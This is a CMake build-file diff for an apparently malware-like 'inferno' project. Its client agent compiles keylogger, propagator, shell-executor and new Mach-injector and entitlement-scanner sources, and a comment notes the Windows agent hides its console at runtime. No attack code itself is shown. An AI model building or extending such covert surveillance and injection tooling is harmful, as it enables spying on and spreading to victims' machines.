@@ -52,6 +52,7 @@ add_executable(inferno_server
     server/src/ui/components/TelemetryPanel.cpp
     server/src/ui/components/KeylogPanel.cpp
     server/src/ui/components/IntelligencePanel.cpp
+    server/src/ui/components/InjectionPanel.cpp
     server/src/ui/components/PropagationPanel.cpp
     server/src/database/Inferno_Database.cpp
     server/src/services/Analysis.cpp
@@ -65,6 +66,7 @@ add_executable(inferno_server
     server/include/ui/components/TelemetryPanel.hpp
     server/include/ui/components/KeylogPanel.hpp
     server/include/ui/components/IntelligencePanel.hpp
+    server/include/ui/components/InjectionPanel.hpp
     server/include/ui/components/PropagationPanel.hpp
     server/include/database/Inferno_Database.hpp
     server/include/services/Analysis.hpp
@@ -87,6 +89,8 @@ add_executable(inferno_client
     client/src/KeyLogger.cpp
     client/src/Propagator.cpp
     client/src/entry_dylib.cpp
+    client/src/EntitlementScanner.cpp
+    client/src/MachInjector.cpp
 )
 target_link_libraries(inferno_client PRIVATE inferno_common)
 
@@ -99,6 +103,7 @@ if(APPLE)
 endif()
 
 if(WIN32)
+    target_compile_definitions(inferno_client PRIVATE _CRT_SECURE_NO_WARNINGS)
     target_link_libraries(inferno_client PRIVATE ws2_32 advapi32 user32)
     # Note: WIN32_EXECUTABLE is intentionally NOT set — the agent uses
     # FreeConsole() at runtime to hide the console window, keeping
@@ -116,6 +121,8 @@ if(APPLE)
         client/src/ShellExecutor.cpp
         client/src/KeyLogger.cpp
         client/src/Propagator.cpp
+        client/src/EntitlementScanner.cpp
+        client/src/MachInjector.cpp
     )
     target_include_directories(inferno_agent_dylib PRIVATE client/include)
     target_compile_definitions(inferno_agent_dylib PRIVATE INFERNO_DYLIB)
@@ -145,6 +152,7 @@ add_executable(inferno_tests
     tests/database_test.cpp
     tests/analysis_test.cpp
     tests/process_profiler_test.cpp
+    tests/scanner_test.cpp
     server/src/network/server.cpp
     server/src/database/Inferno_Database.cpp
     server/src/services/Analysis.cpp
@@ -155,6 +163,9 @@ add_executable(inferno_tests
     client/src/ShellExecutor.cpp
     client/src/KeyLogger.cpp
     client/src/Propagator.cpp
+    client/src/MachInjector.cpp
+    client/src/EntitlementScanner.cpp
+    tests/inject_e2e_test.cpp
 )
 target_include_directories(inferno_tests PRIVATE client/include)
 target_link_libraries(inferno_tests PRIVATE inferno_common Qt6::Widgets Qt6::Gui Qt6::Core Qt6::Sql)
@@ -172,6 +183,7 @@ if(APPLE)
 endif()
 
 if(WIN32)
+    target_compile_definitions(inferno_tests PRIVATE _CRT_SECURE_NO_WARNINGS)
     target_link_libraries(inferno_tests PRIVATE ws2_32 advapi32 user32)
 endif()
 
